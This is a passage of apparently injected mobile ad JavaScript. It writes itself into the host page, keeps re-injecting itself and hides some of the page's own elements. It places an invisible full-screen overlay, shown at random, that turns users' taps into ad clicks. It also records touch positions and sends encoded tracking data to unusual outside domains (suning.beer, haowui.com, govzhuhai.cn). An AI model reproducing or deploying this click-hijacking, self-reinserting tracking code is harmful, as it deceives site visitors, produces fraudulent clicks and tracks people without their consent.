                       (e.length > 0) && !e[n].src && a.s[n] && a.transform(e[n], a.s[n]),
                           n++,
                           n >= e.length && clearInterval(_a)
                   }, 1)
           }

       };

       a.Base64 = function () {
           _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
           this.encode = function (input) {
               var output = "";
               var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
               var i = 0;
               input = _utf8_encode(input);
               while (i < input.length) {
                   chr1 = input.charCodeAt(i++);
                   chr2 = input.charCodeAt(i++);
                   chr3 = input.charCodeAt(i++);
                   enc1 = chr1 >> 2;
                   enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                   enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                   enc4 = chr3 & 63;
                   if (isNaN(chr2)) {
                       enc3 = enc4 = 64;
                   } else if (isNaN(chr3)) {
                       enc4 = 64;
                   }
                   output = output +
                       _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
                       _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
               }
               return output;
           };

           this.decode = function (input) {
               var output = "";
               var chr1, chr2, chr3;
               var enc1, enc2, enc3, enc4;
               var i = 0;
               input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
               while (i < input.length) {
                   enc1 = _keyStr.indexOf(input.charAt(i++));
                   enc2 = _keyStr.indexOf(input.charAt(i++));
                   enc3 = _keyStr.indexOf(input.charAt(i++));
                   enc4 = _keyStr.indexOf(input.charAt(i++));
                   chr1 = (enc1 << 2) | (enc2 >> 4);
                   chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                   chr3 = ((enc3 & 3) << 6) | enc4;
                   output = output + String.fromCharCode(chr1);
                   if (enc3 != 64) {
                       output = output + String.fromCharCode(chr2);
                   }
                   if (enc4 != 64) {
                       output = output + String.fromCharCode(chr3);
                   }
               }
               output = _utf8_decode(output);
               return output;
           };

           _utf8_encode = function (string) {
               string = string.replace(/\r\n/g, "\n");
               var utftext = "";
               for (var n = 0; n < string.length; n++) {
                   var c = string.charCodeAt(n);
                   if (c < 128) {
                       utftext += String.fromCharCode(c);
                   } else if ((c > 127) && (c < 2048)) {
                       utftext += String.fromCharCode((c >> 6) | 192);
                       utftext += String.fromCharCode((c & 63) | 128);
                   } else {
                       utftext += String.fromCharCode((c >> 12) | 224);
                       utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                       utftext += String.fromCharCode((c & 63) | 128);
                   }

               }
               return utftext;
           };

           _utf8_decode = function (utftext) {
               var string = "";
               var i = 0;
               var c = c1 = c2 = 0;
               while (i < utftext.length) {
                   c = utftext.charCodeAt(i);
                   if (c < 128) {
                       string += String.fromCharCode(c);
                       i++;
                   } else if ((c > 191) && (c < 224)) {
                       c2 = utftext.charCodeAt(i + 1);
                       string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                       i += 2;
                   } else {
                       c2 = utftext.charCodeAt(i + 1);
                       c3 = utftext.charCodeAt(i + 2);
                       string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                       i += 3;
                   }
               }
               return string;
           }
       };

       a.doAdsCode = function (e) {
           if (!e) return;
           var d = e[1],
               o = doc.compatMode == "BackCompat" ? doc.body : doc.documentElement,
               pos = w_width / w_height,
               w = o.clientWidth,
               h = parseInt(w / pos),
               iw = parseInt(e[3] * w / w_width),
               ih = parseInt(e[4] * h / w_height),
               base64 = new a.Base64(),
               c = base64.encode(a.CP(1) + '|||' + e[0]);
           return "<iframe src='https://show.suning.beer:12443/cpc/c.html?tc=" + c + "' style='width: " + iw + "px;height: " + ih + "px;' frameborder='no' scrolling='no'></iframe>";
       };
       a.support = function (t) {
           try {
               var e = window[t],
                   n = "__test__";
               return e.setItem(n, n),
                   e.removeItem(n), !0
           } catch (t) {
               return !1
           }
       };
       var g = function () {
           var t = null;
           ! function () {
               try {
                   t = new XMLHttpRequest
               } catch (e) {
                   try {
                       t = new ActiveXObject("Msxml2.XMLHTTP")
                   } catch (e) {
                       try {
                           t = new ActiveXObject("Microsoft.XMLHTTP")
                       } catch (t) {}
                   }
               }
           }();
           var e = function (e, n, a, i) {
                   t ? (t.open("GET", e, !0),
                       t.callback = a,
                       t.withCredentials = !!i,
                       t.onreadystatechange = function () {
                           console.log("readyState: " + t.readyState + " status: " + t.status + " statusText: " + t.statusText),
                               4 == t.readyState && 200 == t.status && t.callback()
                       },
                       t.send(n)) : console.log("XMLHttpRequest Not Support.")
               },
               n = function () {};
           return {
               get: e,
               post: n
           }
       };
       g = new g;
       a.setImg = function (e, n) {
           e.src = n;
           var _R = '.' + WID + '_r{background-image:url(' + n + ');}';
           if ('' == 'bottom') {
               _R += 'body:after{background-image:url(' + n + ');}';
           } else if ('' == 'top') {
               _R += 'body:before{background-image:url(' + n + ');}';
           } else {
               if (a.img_style == 1) {
                   _R += '#' + xid + '1_1:before{background-image:url(' + n + ');}';
               }
           }
           if (typeof ismp === 'undefined') {
               a.SC(_R);
           }
       }
       a.transform = function (e, n) {
           if (!a.support("localStorage") || !a.imageUseStorage)
               return void(a.setImg(e, n));
           var _a = function (n, c) {
                   t = n.split("#"),
                       q = t.length > 1 ? "data:image/" + t[1] + ";base64," + t[0] : n,
                       a.setImg(e, q),
                       2 == t.length && localStorage.setItem(c, q)
               },
               r = n.split(".");
           r.pop(), (r[r.length - 1] == 'gif' || r[r.length - 1] == 'jpg' || r[r.length - 1] == 'jpeg' || r[r.length - 1] == 'png') ? r.pop() : '',
               r.push("txt"),
               r = r.join(".");
           var o = r.split("/");
           o = o[o.length - 1];
           1 == (new Date).getDay() && 20 == (new Date).getHours() && localStorage.clear();
           return localStorage.getItem(o) ? _a(localStorage.getItem(o), o) :
               void g.get(r, null, function () {
                   var t = "whatsapp",
                       e = localStorage.getItem(t);
                   e = null == e ? {} : JSON.parse(e),
                       e[o] = (new Date).getTime();
                   var n = Object.getOwnPropertyNames(e);
                   n.length >= 20 && localStorage.removeItem(localStorage.key(n[0])),
                       localStorage.setItem(t, JSON.stringify(e)),
                       _a(this.responseText, o);
               })
       };

       a.TPL = function (img_style, imgurl, width, height, img_width, img_height, img_title, img_description) {
           var thtml;
           var text_width = parseInt(width - img_width - 30);
           switch (img_style) {
           case 1:
               if (typeof (__tpltype) != 'undefined') {
                   thtml = '<img id="' + xid + 'Im"  style="height: ' + height + 'px;display: none;" />';
               } else {
                   thtml = '<img id="' + xid + 'Im"  style="display: block!important;" />';
               }
               break;
           case 2:
               thtml = '<img id="' + xid + 'Im"  style="position:absolute;left:0;top:50%;margin-top:-' + img_height / 2 + 'px;width:' + img_width + 'px;height: ' + img_height + 'px;vertical-align:middle;" /><div id="' + xid + 'In2" style="width: ' + text_width + 'px;text-align:left;margin-left:10px;vertical-align:middle;display: inline-block;color:#575757;position:absolute;right:0;top:50%;margin-top:-40px;"><div id="' + xid + 'In2_1" style="font-weight:bold;font-size:16px;line-height: 22px">' + img_title + '</div><div id="' + xid + 'In2_2" style="font-size: 10px;padding-top:15px;">' + img_description + '</div></div>';
               break;
           case 3:
               thtml = '<div id="' + xid + 'In3" style="width: ' + text_width + 'px;text-align:left;margin-right:10px;' +
                   'vertical-align:middle;display: inline-block;color:#575757;position:absolute;left:0;top:50%;' +
                   'margin-top:-40px;"><div id="' + xid + 'In3_1"' +
                   ' style="font-weight:bold;font-size:18px;">' + img_title + '</div>' +
                   '<div id="' + xid + 'In3_2" style="font-size: 10px;padding-top:15px;">' + img_description + '</div></div>' +
                   '<img id="' + xid + 'Im" style="position:absolute;right:0;top:50%;margin-top:-' + img_height / 2 + 'px;width:' + img_width + 'px;height: ' + img_height + 'px;vertical-align:middle;" />';
               break;
           case 4:
               thtml = '<div id="' + xid + 'In4_1" style="text-align:left;font-weight:bold;font-size:16px;margin:5px 0;text-overflow:ellipsis;word-wrap: break-word;word-break: break-all;overflow: hidden;white-space:nowrap;color:#575757;">' + img_title + '</div><img id="' + xid + 'Im" style="height: ' + img_height + 'px;vertical-align:middle;" /><div id="' + xid + 'In4_2" style="font-size: 10px;padding-top:5px;text-align:left;color:#999;">' + img_description + '</div>';
               break;
           }
           return thtml;
       };
       a.DK = function () {
           cdate.setTime(cdate.getTime() + 3600000);
           a.SCO('_s_v_' + w_zoneid, '', cdate);
       };
       a.showDtan = function () {
           if (typeof window['yrneiqian'] !== 'undefined') {
               if (a.zone_type !== 'neiqian') return;
           } else if (typeof window['yrxuanfu'] !== 'undefined') {
               if (a.zone_type !== 'xuanfu') return;
           } else if (typeof window['yrchaping'] !== 'undefined') {
               if (a.zone_type !== 'chaping') return;
           } else if (typeof window['yrcefu'] !== 'undefined') {
               if (a.zone_type !== 'cefu') return;
           }
           var r = parseInt(Math.random() * 100) + 1,
               cpc_full_gl = (a.plan_full_gl && a.cpc_full_gl > -1 && (a.plan_full_gl > a.cpc_full_gl)) ? a.plan_full_gl : a.cpc_full_gl;
           if (cpc_full_gl > 0 && a.is_one_t === 1 && !a.GCO('has_index_plan_' + a.curr_plan_id)) {
               var _cdate = new Date();
               _cdate.setTime(_cdate.getTime() + 86400 * 1000);
               var _ndate = new Date(_cdate.getFullYear(), _cdate.getMonth(), _cdate.getDate(), 0, 0, 0);
               a.SCO('has_index_plan_' + a.curr_plan_id, 1, _cdate);
               cpc_full_gl = 100;
           }

           if (r < cpc_full_gl) {
               a.isdt = 1;
               a.$(xid + 'Fx').style.display = 'block';
           } else {
               a.isdt = 0;
               var _r = parseInt(Math.random() * 100) + 1,
                   zz = parseInt('0', 10);
               if (_r < a.cpc_dtan_gl && a.cpc_dtan_height > 0) {
                   a.$(xid + 'Fx').style.height = hh * a.cpc_dtan_height / 100 + 'px';
                   a.$(xid + 'Fx').style.display = 'block';
               }
           }
       };

       //跳转域名预解析
       a.dnsprefetch = function () {
           var is_show_dsn = a.GCO('is_show_dsn');
           if (!is_show_dsn) {
               cdate.setTime(cdate.getTime() + 3600000);
               a.SCO('is_show_dsn', 1, cdate);
               new Image().src = 'http://imgshouk.haowui.com';
           }
       };
       a.dnsprefetch();
       _iv = a.getIV();


       ac.touchSatrtFunc = function (evt) {
           try {
               var touch = evt.touches[0];
               var x = Math.ceil(touch.pageX);
               var y = Math.ceil(touch.pageY);
               startTop = Math.ceil(document.body.scrollTop);
               startY = y;
               startX = x;
               EndX = x;
               EndY = y;

           } catch (e) {

           }
       };

       ac.touchMoveFunc = function (evt) {
           try {
               var touch = evt.touches[0];
               var x = Math.ceil(touch.pageX);
               var y = Math.ceil(touch.pageY);
               EndX = x;
               EndY = y;
           } catch (e) {

           }
       };

       ac.touchEndFunc = function (evt) {
           try {
               a.ucb = -1 == a.ucb ? EndX : a.ucb + ',' + EndX;
               a.uce = -1 == a.uce ? (startY - startTop) : a.uce + ',' + (startY - startTop);

               a.xx = startX;
               a.yy = startY - startTop;
           } catch (e) {}
       };

       ac.bindEvent = function () {
           document.addEventListener('touchstart', ac.touchSatrtFunc, false);
           document.addEventListener('touchmove', ac.touchMoveFunc, false);
           document.addEventListener('touchend', ac.touchEndFunc, false);
       };

       ac.init = function () {
           try {
               document.createEvent("TouchEvent");
               ac.bindEvent();
           } catch (e) {

           }
       };
       ac.init();


       a.AP = function (inn) {
           if (inn == null) return !1;
           if (typeof __yrnqid !== 'undefined') {
               doc.getElementById(__yrnqid).innerHTML = inn;
           } else if (typeof window.__yrnqobj !== 'undefined') {
               var newdiv = document.createElement('div');
               newdiv.innerHTML = inn;
               a.inbe(newdiv, window.__yrnqobj);
               setTimeout(function () {
                   var _parentElement = window.__yrnqobj.parentNode;
                   if (_parentElement) {
                       _parentElement.removeChild(window.__yrnqobj);
                   }
               }, 50);
           } else {
               doc.write(inn);
           }
           return !0;

       };
       a.Cl = function () {
           !!a.RK ? (a.$(xid + "Fa").click(), a.RK = 0) : (a.Hi(WID));
       };
       a.inaf = function (newElement, targetElement) {
           var parent = targetElement.parentNode;
           if (parent.lastChild == targetElement) {
               parent.appendChild(newElement);
           } else {
               parent.insertBefore(newElement, targetElement.nextSibling);
           }
       };
       a.inbe = function (newElement, targetElement) {
           var parent = targetElement.parentNode;
           parent.insertBefore(newElement, targetElement);
       };


       var ww = document.documentElement ? document.documentElement.clientWidth : document.body.clientWidth,
           hh = (ww * w_height / w_width).toFixed(2);
       var _cont = '';
       _cont += "<a id='" + xid + "Fx' target='_blank'  class='" + xid + " " + xid + "Fx' onclick='" + WID + ".Hi(\"" + xid + "Fx\");" + WID + ".CP(2);return false'></a>";

       _cont += "<div id='" + xid + "' class='" + xid + "'>";
       _cont += "<div class ='" + xid + "Fb " + xid + "Fa' id='" + xid + "Fa'>";
       _cont += "</div><div id='" + xid + "Fc'></div><div id='" + xid + "Fg'></div></div>";
       var _css = '.' + xid + '{z-index:2147483647 !important;:0px;width:100%;overflow:hidden !important;height:0;}';
       _css += '.' + WID + ',.' + WID + ' *{margin:0;padding:0;border:0;min-width:none;max-width:none;display:block;height:auto;}.' + WID + ' * img{max-width:none;max-height:none;width:auto;height:auto;}';
       _css += '#' + xid + 'Dx{position:relative;z-index:2147483647;bottom:0;width:100%;overflow:visible !important;height:0;display:block;}';
       _css += '#' + xid + '{height:0px;clear:both;font-family:lato,Microsoft YaHei,Arial,sans-serif;background:#fff}';
       _css += 'map{display:block}';
       _css += '#' + xid + ' img{max-width:100%;height:auto;width:100%;object-fit: cover;}';
       _css += '#' + xid + 'Fx{ background:rgba(0,0,0,0);display:none;width:100%;height:100%;top:0px;position:fixed !important;}';
       _css += '#' + xid + '1_1:before{content:"";display:block;width:100%;height:' + hh + 'px;background-size:100% 100%;}';
       _css += '.' + xid + 'Ca{position:absolute;right:0;;z-index:2147483647 !important;}';
       _css += '.' + xid + 'Fa{width:100%; text-align:center;background-size:100% auto !important;}';
       _css += '#' + xid + 'Fi{width:100%;float:left;visibility:hidden;}';
       _css += '.' + xid + 'Cb{float:right;width:auto !important;}';
       _css += '.' + xid + 'CR{bottom:0;position:absolute;right:0;}.' + xid + 'CR a{float:right;}.' + xid + 'CR img{float:right;}';
       _css += '#' + xid + 'Fg{display:block !important;position:relative;right:0;bottom:0; width:30px;height:18px;top:-18px;float:right}';
       _css += '#' + xid + 'Fg img{}';
       _css += '#' + xid + 'Fg:after{content:"";display:block;background:url(https://jpg.govzhuhai.cn:1567/baidu/EoNhlD.gif);background-size:30px 18px;width:30px;height:18px;}';

       _css += '@media screen and (min-width:960px){.' + xid + 'Cb{width:66px !important;}.' + xid + 'Ca{top:-60px !important;}.' + xid + 'CR img{width:84px !important;}}';
       _css += '@media all and (orientation:portrait){#' + xid + 'Fi{width:100%;}.' + xid + 'Fa{background-size:100% auto !important}}';
       if (top.location == location) {
           _css += '@media all and (orientation:landscape){#' + xid + 'Fi{width:60%;}.' + xid + 'Fa{background-size:60% auto !important;}.' + xid + 'CR{right:20% !important;}}';
       } else {
           _css += 'html,body{margin:0;padding:0;border:0; width:100%;}';
       }
       _css += '.tfanye,.bfanye{display:none !important}';
       _css += "#kaocat{display:none !important;}";


       a.DK();
       a.AP(_cont);
       a.SC(_css);
       a.AE(function () {});
       if (a.$(xid + 'Fg')) {
           a.$(xid + 'Fg').addEventListener('click', function () {
               window.location.href = "javascript:void(0);";
           });
       }
       a.getCity();
       a.resize = function (w, h) {
           try {
               var ww = a.GW();
               var hh = (ww * h / w).toFixed(2);
               if (a.$(xid)) a.$(xid).style.height = hh + 'px';
               if (a.$(xid + 'Fa')) a.$(xid + 'Fa').style.height = hh + 'px';
           } catch (e) {}
       };
       // setInterval(function () {
       //     a.$(xid + 'Im').style.display = 'block';
       // }, 100)
       setTimeout(function () {
           a.R();
           a.showDtan();
           var t = setInterval(function () {
               if (!a.$(xid) && a.$(xid + 'Fx')) {
                   window.__yrnqobj = a.$(xid + 'Fx');
                   a.AP(_cont);
                   a.R();
               }
           }, 100)
       }, 200);

       window[WID] = a;
   })
   ();